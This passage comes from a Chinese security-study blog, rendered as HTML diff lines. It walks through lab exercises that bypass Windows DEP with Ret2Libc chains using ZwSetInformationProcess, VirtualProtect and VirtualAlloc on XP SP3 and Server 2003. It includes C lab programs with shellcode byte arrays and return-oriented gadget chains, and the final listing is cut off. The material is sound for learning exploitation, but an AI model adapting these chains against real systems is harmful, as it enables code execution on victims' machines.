+<p>当弹出“开始溢出”对话框时用OllyDbg附加IE进程，附加好后用F9继续执行。而shellcode地址可以通过OllyFindAddr插件中的Custom-Search搜索弹出对话框机器码的前4字节&quot;FC686A0A&quot;来定位shellcode</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/09/0day/攻击DEP的方法-上/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Introspelliam">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/07/09/0day/攻击DEP的方法-上/" itemprop="url">攻击DEP的方法（上）——Ret2Libc</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-09T18:27:43+08:00">
+                2017-07-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全技术/" itemprop="url" rel="index">
+                    <span itemprop="name">安全技术</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="利用Ret2Libc挑战DEP"><a href="#利用Ret2Libc挑战DEP" class="headerlink" title="利用Ret2Libc挑战DEP"></a>利用Ret2Libc挑战DEP</h2><p>让代码跳转到已经存在的系统函数中就不会被DEP拦截，Ret2libc攻击就是这个原理。（Return to libc）。简言之，就是shellcode的每条指令都可以在代码区中找到一条替代指令。但是这种方法太繁重，而且不好控制栈帧。<br><img src="/images/2017-07-09/ret2libc.jpg" alt="ret2libc具体流程"></p>
+<p>所以有以下三种方法：</p>
+<ol>
+<li>通过跳转到ZwSetInformationProcess函数将DEP关闭后再转入shellcode执行</li>
+<li>通过跳转到VirtualProtect函数将shellcode所在内存页设置爱为可执行状态，然后在转入shellcode执行</li>
+<li>通过跳转到VirtualAlloc函数开辟一段具有执行权限的内存空间，然后将shellcode复制到段内存中执行</li>
+</ol>
+<h3 id="1-Ret2Libc之利用ZwSetInformationProcess"><a href="#1-Ret2Libc之利用ZwSetInformationProcess" class="headerlink" title="1. Ret2Libc之利用ZwSetInformationProcess"></a>1. Ret2Libc之利用ZwSetInformationProcess</h3><h4 id="1-1-ZwSetInformationProcess简介"><a href="#1-1-ZwSetInformationProcess简介" class="headerlink" title="1.1 ZwSetInformationProcess简介"></a>1.1 ZwSetInformationProcess简介</h4><p>API函数ZwQueryInformationProcess和ZwSetInformationProcess进行查询和修改(有些资料中是NtQueryInformationProcess和NtSetInformationProcess)。</p>
+<p>进程的DEP设置标识保存在KPROCESS结构中的_KEXECUTE_OPTIONS上。</p>
+<pre><code>_KEXECUTE_OPTIONS
+Pos0 ExecuteDisable: 1bit
+Pos1 ExecuteEnable: 1bit
+Pos2 DisableThunkEmulation: 1bit
+Pos3 Permanent: 1bit
+Pos4 ExecuteDispatchEnable: 1bit
+Pos5 ImageDispatchEnable: 1bit
+Pos6 Spare: 2bit
+</code></pre>
+
+<p>前4个bit与DEP有关，当前进程DEP开启时ExecuteDisable位为1，当前进程DEP关闭时ExecuteEnable位为1，DisableThunkEmulation是为了兼容ATL程序设置的，Permanent被置为1后表示这些标志位都不能被修改。</p>
+<pre><code>NtSetInformationProcess(
+    IN HANDLE ProcessHandle,
+    IN PROCESS_INFORMATION_CLASS ProcessInformationClass,
+    IN PVOID ProcessInformation,
+    IN ULONG ProcessInformationLength
+);
+</code></pre>
+
+<p>第一个参数为进程句柄，设置为-1表示当前进程；第二个参数为信息类；第三个参数可以用来设置_KEXECUTE_OPTIONS；第四个参数为第三个参数的长度。于是，最终的参数设置为：</p>
+<pre><code>
+ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;
+ZwSetInformationProcess(
+    NtCurrentProcess(),        // (HANDLE)-1
+    ProcessExecuteFlags,    // 0x22
+    &ExecuteFlags,            // ptr to 0x2
+    sizeof(ExecuteFlags)    // 0x4
+);
+</code></pre>
+
+<p>但是问题是函数参数中会包含0x00这样的截断字符。其实解决办法是微软的兼容性考虑：如果一个进程的Permanent位没设置，当它加载DLL时，系统会对这个DLL进行DEP兼容性检查，当存在兼容性问题时进程的DEP就会关闭。为此微软设立了LdrpCheckNXCompatibility函数，当符合下列条件之一进程的DEP就会被关闭：</p>
+<ol>
+<li>当DLL受SafeDisc版权保护系统保护时</li>
+<li>当DLL包含有.aspcak、.pcle、.sforce等字节时</li>
+<li>Windows Vista下面当DLL包含在注册表&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions&quot;键下边标识出不需启动DEP的模块时</li>
+</ol>
+<p>以SafeDisc为例，查看Windows XP SP3下LdrpCheckNXCompatibility关闭DEP的具体流程：<br><img src="/images/2017-07-09/safedisc.jpg" alt="具体流程"></p>
+<p>我们可以模拟这个过程，从0x7C93CD24入手关闭DEP，这个地址可通过OllyFindAddr插件中的Disable DEP-&gt;Disable DEP&lt;=XP SP3来搜索<br><img src="/images/2017-07-09/find_addr.jpg" alt="DEP起始地址"><br>由于只有CMP AL,1 成立的情况下程序继续执行，所以需要一个指令将AL修改为1。将AL修改为1后让程序转到0x7C93CD24执行，在执行0x7C93CD6F处的RETN 4时DEP已经关闭，此时如果我们可以在RETN到一个精心构造的指令地址上，就可能转入shellcode中执行。<br><img src="/images/2017-07-09/retn_4.jpg" alt="跳转地址"></p>
+<h4 id="1-2-实验代码"><a href="#1-2-实验代码" class="headerlink" title="1.2 实验代码"></a>1.2 实验代码</h4><pre><code>
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+char shellcode[] = 
+    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
+    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
+    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
+    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
+    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
+    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
+    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
+    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x52\xE2\x92\x7C"        // MOV EAX, 1   RETN地址
+    "\x85\x8B\x1D\x5D"        // 修正EBP
+    "\x19\x4A\x97\x7C"        // 增大ESP
+    "\xB4\xC1\xC5\x7D"        // jmp esp
+    "\x24\xCD\x93\x7C"        // 关闭DEP代码的起始位置
+    "\xE9\x33\xFF\xFF\xFF\x90\x90\x90";    // 回跳指令
+
+void test()
+{
+    char str[176];
+    //__asm int 3
+    strcpy(str, shellcode);
+}
+
+int main()
+{
+    HINSTANCE hInst = LoadLibrary("shell32.dll");
+    char temp[200];
+    test();
+    return 0;
+}
+</code></pre>
+
+<h4 id="1-3-Windows-XP-SP3实验内容"><a href="#1-3-Windows-XP-SP3实验内容" class="headerlink" title="1.3  Windows XP SP3实验内容"></a>1.3  Windows XP SP3实验内容</h4><p><b>实验思路：</b></p>
+<ol>
+<li>为了更直观，将不启用GS和SafeSEH</li>
+<li>函数test存在典型的溢出，通过向str复制超长字符串造成str溢出，进而覆盖函数返回地址</li>
+<li>将函数的返回地址覆盖为类似MOV AL,1 retn的指令，在将AL置1后转入0x7C93CD24关闭DEP</li>
+<li>DEP关闭后shellcode就可以正常执行</li>
+</ol>
+<p><b>实验环境</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td></td>
+</tr>
+<tr>
+<td>DEP状态</td>
+<td>Optout</td>
+<td></td>
+</tr>
+<tr>
+<td>编译器</td>
+<td>VC 6.0</td>
+<td></td>
+</tr>
+<tr>
+<td>编译选项</td>
+<td>禁用优化选项</td>
+<td></td>
+</tr>
+<tr>
+<td>build版本</td>
+<td>debug版本</td>
+</tr>
+</tbody>
+</table>
+<font color="#f00">由于不知道如何设置VC6.0的release版本的禁用编译优化选项，所以直接使用了Debug版本！其实查看是否被优化，可以设置int 3断点，查看后续指令是否按照正常顺序执行！</font>
+
+<p>从上面的OllyFindAddr插件中的Disable DEP-&gt;Disable DEP&lt;=XP SP3搜索结果可以看出，step2提供了符合“将AL置1并收回程序控制权”要求的指令。本次使用0x7C92E252。<br>经过测试得到溢出字符串的起始地址:0x0012FDB0<br>test函数的返回地址:0x0012FE64<br>覆盖返回地址:0x7C92E252</p>
+<p>调试发现，收回程序控制权之后，EIP修改为红框表示的值。所以为了让程序转入关闭DEP，需要返回地址后添加4字节0x7C93CD24。<br><img src="/images/2017-07-09/ret_addr.jpg" alt="接受程序控制权"></p>
+<p>重新编译调试，根据Windows XP SP3下LdrpCheckNXCompatibility关闭DEP的具体流程可以知道，在0x7c93CD29处的跳转是将ESI的值赋给[EBP-4]，但是EBP在溢出的时候被破坏了，目前EBP-4的位置并不可写入，所以程序异常。<br><img src="/images/2017-07-09/edit_ebp.jpg" alt="给ebp-4地址赋值"></p>
+<p>所以在转入0x7C93CD24前，需将EBP指向一个可写的位置，为此可以通过PUSH ESP POP EBP RETN的指令将EBP定位到一个可写的位置，此指令在Disable DEP-&gt;Disable DEP&lt;=XP SP3的step3部分可以查看。但是若用此指令序列，若直接将ESP的值赋给EBP返回后，ESP相对于EBP位于高址位置，当有入栈操作时EBP-4可能被冲刷掉，所以用PUSH ESP POP EBP RETN 4来修正。此处使用的0x5D1D8B85处的地址。</p>
+<p>当进入0x7C93CD33处的函数后，可以看到EBP-4中的内容已经被冲刷掉，内容修改为0x22，而_KEXECUTE_OPTIONS结构中只有前4位有关，0x22(00100010)代表关闭DEP。<br><img src="/images/2017-07-09/ZwSetInformationProcess.jpg" alt="ZwSetInformationProcess设置"></p>
+<p>虽然关闭了DEP，但是失去了进程的控制权。<br><img src="/images/2017-07-09/ret_addr2.jpg" alt="失去控制权"></p>
+<p>当ESP小于EBP时，可以用减小ESP或者增大EBP的方法。由于shellcode位于内存低址，所以减小ESP可能会破坏shellcode，所以可以增大EBP，但是本实验找不到！变通的方法是增大ESP到安全位置，让EBP和ESP之间的空间足够大，这样压栈就不会冲刷EBP内容。<br>可以用OllyFindAddr插件中的Overflow return address-&gt;POP RETN+N选项查找指令。我们选择0x7C974A19处的RETN 0x28来增大ESP。</p>
+<p>这其中的关系有点绕，所以我也不打算继续讲了，需要我们进行实际调试！</p>
+<p><b>最终的shellcode组成</b></p>
+<ol>
+<li>【操作7】168字节的弹出对话框机器码</li>
+<li>12字节的0x90填充</li>
+<li>【操作1】将AL置1，并重新掌握控制权 &quot;\x52\xE2\x92\x7C&quot;</li>
+<li>【操作2】修正EBP &quot;\x85\x8B\x1D\x5D&quot;</li>
+<li>【操作3】增大ESP &quot;\x19\x4A\x97\x7C&quot;</li>
+<li>【操作5】 JMP ESP至最后一段 &quot;\xB4\xC1\xC5\x7D&quot;</li>
+<li>【操作4】关闭DEP &quot;\x24\xCD\x93\x7C&quot;</li>
+<li>【操作6】回跳至shellcode &quot;\xE9\x33\xFF\xFF\xFF\x90\x90\x90&quot;</li>
+</ol>
+<h4 id="1-4-Windows-Server-2003-SP2实验内容"><a href="#1-4-Windows-Server-2003-SP2实验内容" class="headerlink" title="1.4 Windows Server 2003 SP2实验内容"></a>1.4 Windows Server 2003 SP2实验内容</h4><font color="#f00">我的实验是用的Windows Server 2003 Enterprise SP2</font>
+
+<p>由于windows 2003 SP2对LdrpCheckNXCompatibility函数进行了少许修改，导致该函数在执行的过程中会对ESI指向的内存附近进行操作。所以可以利用push esp pop esi retn来调整ESI，这些指令在Disable DEP-&gt;Disable DEP&gt;=2003 SP2搜索结果的step4部分。</p>
+<p>变通的方法：</p>
+<ol>
+<li>找到pop eax retn指令，并让程序转入该位置执行</li>
+<li>找到一条pop esi retn指令，并保证在执行1中的pop eax时对它的地址位于栈顶，这就可以将地址放到eax中</li>
+<li>找到push esp jmp eax指令，并转入执行</li>
+</ol>
+<p>最终windows server 2003 sp2测试时对应的代码为：</p>
+<pre><code>
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+char shellcode[] = 
+    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
+    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
+    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
+    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
+    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
+    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
+    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
+    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\xE9\x77\xBE\x77"        // 修正EBP
+    "\x81\x71\xBA\x7C"        // pop eax retn
+    "\x0A\x1A\xBF\x7C"        // pop pop pop retn
+    "\xA5\x6F\xBE\x7C"        // pop esi retn
+    "\xBF\x7D\xC9\x77"        // push esp jmp eax
+    "\x5F\xFB\x87\x7C"        // retn 0x30
+    "\x17\xF5\x96\x7C"        // 关闭DEP代码的起始位置
+    "\x23\x1E\x1A\x7D"        // jmp esp
+    "\xE9\x27\xFF\xFF\xFF\x90\x90\x90";  // jmp shellcode
+
+void test()
+{
+    char str[176];
+    //__asm int 3
+    strcpy(str, shellcode);
+}
+
+int main()
+{
+    HINSTANCE hInst = LoadLibrary("shell32.dll");
+    char temp[200];
+    test();
+    return 0;
+}
+</code></pre>
+
+<p>溢出字符串开始地址：0x0012FDB0<br>返回地址所在位置：0x0012FE64<br>修正EBP地址：0x77BE77E9 (push esp pop ebp retn 4)<br>pop eax retn所在地址: 0x7CbA7181<br>由于retn 4，所以下面一条指令在0x7CBA7181后面4字节处，但是由于先pop eax，所以应该返回值0x7CBA7181后8字节处进行push esp jmp eax的操作: 0x77C97DBF<br>然后通过jmp eax跳回去执行pop esi retn指令（0x7CBA7181后面4字节处）：0x7CBE6FA5</p>
+<p>然后就是执行增大ESP，创造足够大的空间：0x7C87FB5F<br>然后关闭DEP：0x7C96F517(这里直接进入了ZwSetInformationProcess所在路径)</p>
+<p>不知道怎么回事，反正就是到了0x7CBA7181后，这时候使用pop pop pop retn：0x7CBF1A0A<br>于是到了0x&amp;C96F517之后，这时候用jmp esp指令：0x7D1A1E23<br>然后是回跳至shellcode位置，代码\xE9\x27\xFF\xFF\xFF<br>最后用\x90\x90\x90填充</p>
+<h3 id="2-Ret2Libc之利用VirtualProctect"><a href="#2-Ret2Libc之利用VirtualProctect" class="headerlink" title="2. Ret2Libc之利用VirtualProctect"></a>2. Ret2Libc之利用VirtualProctect</h3><h4 id="2-1-VirtualProtect简介"><a href="#2-1-VirtualProtect简介" class="headerlink" title="2.1 VirtualProtect简介"></a>2.1 VirtualProtect简介</h4><p>位于Kernel32.dll上的VirtualProtect是为了解决：Optout和AlwaysON模式下所有进程是默认开启DEP，而如果程序自身偶尔需要从堆栈中取指令，就会出错的问题。</p>
+<p>其可修改指定内存的属性，包括是否可执行。</p>
+<pre><code>
+BOOL VirtualProtect{
+  LPVOID lpAddress,
+  DWORD dwSize,
+  DWORD flNewProtect,
+  PDWORD lpflOldProtect
+};
+</code></pre>
+lpAddress：要改变属性的内存起始地址
+dwSize：要改变属性的内存区域大小
+flNewProtect：内存新的属性类型，设为PAGE_EXECUTE_READWRITE(0x40)是该内存也可读可写可执行
+lpflOldProtect：内存原始属性类型保存地址
+
+如果能够向下面方式布置，就可让shellcode可执行
+<pre><code>
+BOOL VirtualProtect{
+  shellcode所在内存空间起始地址,
+  shellcode大小,
+  0x40,
+  某个可写地址
+};
+</code></pre>
+
+<p>注意：</p>
+<ol>
+<li>由于实验时参数包含0x00，为了方便，将strcpy改为memcoy</li>
+<li>对shellcode内存空间起始地址的确定，不同机器会有变化，本实验用巧妙的栈帧构造动态确定shellcode所在内存空间起始地址</li>
+</ol>
+<h4 id="2-2-实验代码"><a href="#2-2-实验代码" class="headerlink" title="2.2 实验代码"></a>2.2 实验代码</h4><pre><code>
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+char shellcode[] = 
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x8A\x17\x84\x7c"            // pop eax retn
+    "\x0A\x1A\xBF\x7C"            // pop pop pop retn
+    "\xBA\xD9\xBB\x7C"            // 修正EBP
+    "\x8B\x17\x84\x7C"            //RETN
+    "\x90\x90\x90\x90"            
+    "\xBF\x7D\xC9\x77"            // push esp jmp eax(后来成为shellcode起始地址)
+    "\xFF\x00\x00\x00"            // 要修改的内存大小
+    "\x40\x00\x00\x00"            // 可读可写可执行属性代码
+    "\xBF\x7D\xC9\x77"            // push esp jmp eax(后来成为某个可写地址)
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\xE8\x1F\x80\x7C"            // 修改内存属性
+    "\x90\x90\x90\x90"
+    "\xA4\xDE\xA2\x7C"            // jmp esp
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
+    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
+    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
+    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
+    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
+    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
+    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
+    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";
+
+void test()
+{
+    char str[176];
+    //__asm int 3
+    memcpy(str, shellcode, 420);
+}
+
+int main()
+{
+    HINSTANCE hInst = LoadLibrary("shell32.dll");
+    char temp[200];
+    test();
+    return 0;
+}
+
+</code></pre>
+
+<h4 id="2-3-实验内容"><a href="#2-3-实验内容" class="headerlink" title="2.3 实验内容"></a>2.3 实验内容</h4><p><b>实验解释</b></p>
+<ol>
+<li>本实验不启用GS和DEP</li>
+<li>test有典型的溢出</li>
+<li>覆盖返回地址后，通过Ret2Libc技术，利用VirtualProtect函数将shellcode所在的内存区域设置为可执行模式</li>
+<li>通过push esp jmp eax指令序列动态设置VirtualProtect函数中的shellcode所在内存起始地址以及内存原始属性类型保存地址</li>
+<li>内存取悦被设置为可执行模式后shellcode就可正常执行了</li>
+</ol>
+<p><b>实验环境</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows 2003 SP2</td>
+<td></td>
+</tr>
+<tr>
+<td>DEP状态</td>
+<td>Optout</td>
+<td></td>
+</tr>
+<tr>
+<td>编译器</td>
+<td>VC 6.0</td>
+<td></td>
+</tr>
+<tr>
+<td>编译选项</td>
+<td>禁用优化选项</td>
+<td></td>
+</tr>
+<tr>
+<td>build版本</td>
+<td>debug版本</td>
+</tr>
+</tbody>
+</table>
+<p><b>VirtualProtect函数的具体实现</b><br><img src="/images/2017-07-09/virtualprotect.jpg" alt="virtualprotect具体实现"><br>如图，我们可以选择0x7C801FE8作为切入点，按照函数要求布置好栈帧。</p>
+<p>由于溢出过程导致EBP被破坏，所以可用PUSH ESP POP EBP ERTN 4来修复。</p>
+<p>溢出字符串的起始地址：0x0012FDB0<br>返回地址所在位置: 0x0012FE64<br>修正EBP地址(push esp pop ebp retn 4)：0x7CBBD9BA<br>由于执行完这些指令后，esp就转到了ebp+8。此时状态如下:<br><img src="/images/2017-07-09/ret2libc_vp.jpg" alt="修正EBP后的"></p>
+<p>于是可以尝试让ESP向下移动4字节，RETN指令即可，此处用的是0x7C84178B处，最后ESP=0x0012FE74。然后用PUSH ESP RETN/JMP **指令，就可以让esp继续向下移动4字节，并且保证进入shellcode中，0x77C97DBF处的&quot;push esp jmp eax&quot;符合要求。但是shellcode现在还没有执行能力，所以需要修改一下shellcode，在修正EBP之前先pop eax retn。此时的eax对应的是pop pop pop retn。后续都是调试出来的，现如今还无法讲清楚！！！！</p>
+<p>然后继续调试，最终得到上面代码中的shellcode。</p>
+<h3 id="3-Ret2Libc之利用VirtualAlloc"><a href="#3-Ret2Libc之利用VirtualAlloc" class="headerlink" title="3. Ret2Libc之利用VirtualAlloc"></a>3. Ret2Libc之利用VirtualAlloc</h3><h4 id="3-1-VirtualAlloc简介"><a href="#3-1-VirtualAlloc简介" class="headerlink" title="3.1 VirtualAlloc简介"></a>3.1 VirtualAlloc简介</h4><p>位于kernel32.dll中的VirtualAlloc函数可以申请一段具有可执行属性的内存。于是可以用Ret2Libc的第一跳设置为VirtualAlloc函数地址，然后将shellcode复制到申请的内存空间执行</p>
+<p>VirutlAlloc函数说明</p>
+<pre><code>LPVOID WINAPI VirtualAlloc{
+    __in_opt LPVOID lpAddress,
+    __in      SIZE_T dwSize,
+    __in      DWORD flAllocationType,
+    __in     DWORD flProtect
+};
+</code></pre>
+
+<p>lpAddress: 申请内存区域的地址，如果参数是NULL，系统将会决定分配内存取悦位置，并且按照64KB向上取整<br>dwSize：申请内存的类型<br>flAlloctionType: 申请内存的类型<br>flProtect：申请内存的访问控制类型，如读写执行等</p>
+<h4 id="3-2-实验代码"><a href="#3-2-实验代码" class="headerlink" title="3.2 实验代码"></a>3.2 实验代码</h4><pre><code>
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+char shellcode[] = 
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\xBA\xD9\xBB\x7C"            // 修正EBP
+    "\xBC\x45\x82\x7C"            // 申请空间
+    "\x90\x90\x90\x90"
+    "\xFF\xFF\xFF\xFF"            // -1 当前进程
+    "\x00\x00\x03\x00"            // 申请空间起始地址
+    "\xFF\x00\x00\x00"            // 申请空间大小
+    "\x00\x10\x00\x00"            // 申请类型
+    "\x40\x00\x00\x00"            // 申请空间访问类型
+    "\x90\x90\x90\x90"
+    "\x8A\x17\x84\x7C"            // pop eax retn
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x0B\x1A\xBF\x7C"            // pop pop retn
+    "\xBA\xD9\xBB\x7C"            // 修正EBP retn 4
+    "\x5F\x78\xA6\x7C"            // pop retn
+    "\x00\x00\x03\x00"            // 可执行内存空间地址，转入执行用
+    "\x00\x00\x03\x00"            // 可执行内存空间地址，复制用
+    "\xBF\x7D\xC9\x77"            // push esp jmp eax && 原始shellcode起始地址
+    "\xFF\x00\x00\x00"            // shellcode 长度
+    "\xAC\xAF\x94\x7C"            // memcpy
+    "\x00\x00\x03\x00"            // 一个可以读地址
+    "\x00\x00\x03\x00"            // 一个可以读地址
+    "\x00\x90\x90\x94"    
+    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
+    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
+    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
